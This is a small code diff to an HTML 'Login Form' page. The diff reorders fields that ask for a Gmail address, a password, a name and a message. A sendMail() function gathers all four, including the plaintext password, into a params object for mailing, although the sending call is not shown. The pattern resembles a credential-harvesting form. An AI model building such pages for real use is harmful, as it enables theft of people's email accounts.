@@ -78,13 +78,16 @@
 
   <h2>Login Form</h2>
 
-  <input type="text" id="name" placeholder="Enter name">
-
+  <!-- Gmail first -->
   <input type="email" id="email" placeholder="Enter your Gmail">
 
-  <!-- Password field -->
+  <!-- Password second -->
   <input type="password" id="password" placeholder="Enter password">
 
+  <!-- Name third -->
+  <input type="text" id="name" placeholder="Enter name">
+
+  <!-- Message fourth -->
   <input type="text" id="message" placeholder="Enter message">
 
   <button onclick="sendMail()">Send</button>
@@ -95,21 +98,21 @@
 
 function sendMail(){
 
-    let name = document.getElementById("name").value;
     let email = document.getElementById("email").value;
     let password = document.getElementById("password").value;
+    let name = document.getElementById("name").value;
     let message = document.getElementById("message").value;
 
     // Validation
-    if(name === "" || email === "" || password === "" || message === ""){
+    if(email === "" || password === "" || name === "" || message === ""){
         alert("Please fill all fields!");
         return;
     }
 
     let params = {
-        name: name,
         email: email,
         password: password,
+        name: name,
         message: message
     };
 
